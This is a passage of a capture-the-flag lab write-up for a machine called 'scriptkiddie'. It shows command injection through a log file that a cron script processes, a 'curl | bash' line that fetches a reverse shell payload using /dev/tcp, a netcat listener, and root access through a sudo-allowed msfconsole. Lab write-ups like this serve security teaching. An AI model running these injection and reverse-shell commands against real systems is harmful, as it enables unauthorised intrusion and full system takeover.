+> 2025/04/08 13:57:53 CMD: UID=1001  PID=1689   | sh -c nmap --top-ports 10 -oN recon/; ping -c1 10.10.16.37 #.nmap ; ping -c1 10.10.16.37 # 2>&1 >/dev/null 
+> 2025/04/08 13:57:53 CMD: UID=1001  PID=1690   | /bin/bash /home/pwn/scanlosers.sh 
+> 2025/04/08 13:58:01 CMD: UID=0     PID=1693   | /usr/sbin/CRON -f 
+> 2025/04/08 13:58:01 CMD: UID=0     PID=1692   | /usr/sbin/CRON -f 
+> 
+> ```
+>
+
+The `/home/pwn/scanlosers.sh` script is executed by the user identified by *UID 1001*
+
+```bash
+id 1001
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
+> ```
+>
+
+It is the *pwn* user
+
+Therefore, if we inject an *arbitrary command* via the *log file*, when the *pwn user* executes the *scanlosers.sh* script, we will run system commands as *pwn*
+
+So, we can do the *PoC* using a `ping` command to check if we receive an *ICMP* packet
+
+If we do so, we can proceed by injecting the typical *bash oneliner* to send a *reverse shell* from the *target* to our machine
+
+Therefore, we can use `tcpdump` to listen for *icmp packets* from the attacker
+
+```bash
+tcpdump --interface tun0 -v -n icmp
+```
+
+And inject the command into the log file by adding the following line →
+
+```bash
+echo 'x y ; ping -c1 10.10.16.37 #' >> /home/kid/logs/hackers
+```
+
+> [!NOTE]- *TCPDump Output*
+>
+> ```bash
+> tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+> 20:58:21.769084 IP (tos 0x0, ttl 63, id 57763, offset 0, flags [DF], proto ICMP (1), length 84)
+> 10.129.95.150 > 10.10.16.37: ICMP echo request, id 11, seq 1, length 64
+> 20:58:21.769136 IP (tos 0x0, ttl 64, id 38002, offset 0, flags [none], proto ICMP (1), length 84)
+> 10.10.16.37 > 10.129.95.150: ICMP echo reply, id 11, seq 1, length 64
+> ```
+>
+
+And we received them!
+
+So, let's leverage of the *index.html* created to share it through a *Simple HTTP Server* with python and inject a command requesting the content of this file and interpret its content with *bash*
+
+> [!BUG]- *index.html*
+>
+> ```bash
+> bash -i &> /dev/tcp/10.10.16.37/443 0>&1 
+> ```
+>
+
+- ***From the Attacker*** ⚔️
+
+```bash
+python3 -m http.server 80
+```
+
+```bash
+nc -nvlp 443
+```
+
+- ***From the Target*** 🎯
+
+```bash
+echo 'x y ; curl 10.10.16.37|bash #' >> /home/kid/logs/hackers
+```
+
+> [!NOTE]- *Simple HTTP Server Output*
+>
+> ```bash
+> Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+> 10.129.95.150 - - [07/Apr/2025 21:05:38] "GET / HTTP/1.1" 200 -
+> ```
+>
+
+> [!NOTE]- *Netcat Output*
+> 
+> ```bash
+> listening on [any] 443 ...
+> connect to [10.10.16.37] from (UNKNOWN) [10.129.95.150] 59338
+> bash: cannot set terminal process group (805): Inappropriate ioctl for device
+> bash: no job control in this shell
+> pwn@scriptkiddie:~$
+> ```
+>
+
+And we received a reverse connection!
+
+#### Privesc #2
+
+***Non-Privileged User → pwn***
+
+##### *MSFConsole using Sudo*
+
+Again, first of all, we see which groups the current user belongs to
+
+```bash
+id
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
+> ```
+>
+
+Nothing interesting
+
+Next, we check if the current user has any *sudoers* privileges assigned
+
+```bash
+sudo -l
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Matching Defaults entries for pwn on scriptkiddie:
+>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+> 
+> User pwn may run the following commands on scriptkiddie:
+>     (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+> pwn@scriptkiddie:~$ id
+> uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
+> ```
+>
+
+And we have one!
+
+This time we can run the binary `/opt/metasploit-framework-6.0.9/msfconsole` as *root* without providing a password for the user
+
+It seems to be the full path of the *msfconsole* binary
+
+```bash
+command -V msfconsole
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> msfconsole is /usr/local/bin/msfconsole
+> ```
+>
+
+But it's not, so we will have to specify the full path to the binary in order to run it as *root* without providing a password
+
+```bash
+sudo -u root /opt/metasploit-framework-6.0.9/msfconsole
+```
+
+We will enter to the *metasploit console* as *root*, so any command execute inside it will be as *root*
+
+From here, we can just spawn a [[BASH|bash]] as follows
+
+```bash
+msf6 > bash
+```
+
+> [!NOTE]- *Command Output*
+> 
+> ```bash
+> [*] exec: bash
+> 
+> root@scriptkiddie:/home/pwn# 
+> ```
+>
+
+Or, we could enter to the *IRB (Interactive Ruby Shell)* and proceed as follows in order to execute any system command
+
+> ***[Reference](https://gtfobins.github.io/gtfobins/msfconsole/)***
+
+```bash
+msf6 > irb
+>> system("/bin/bash")
+```
+
+> [!NOTE]- *Command Output*
+> 
+> ```bash
+> [*] Starting IRB shell...
+> [*] You are in the "framework" object
+>
+> system("/bin/bash")
+> root@scriptkiddie:/home/pwn#
+> ```
+>
+
+And we're done! Just grab the *root.txt* flag and move on to the next machine 😊
+
+```bash
+cat /root/root.txt
+```
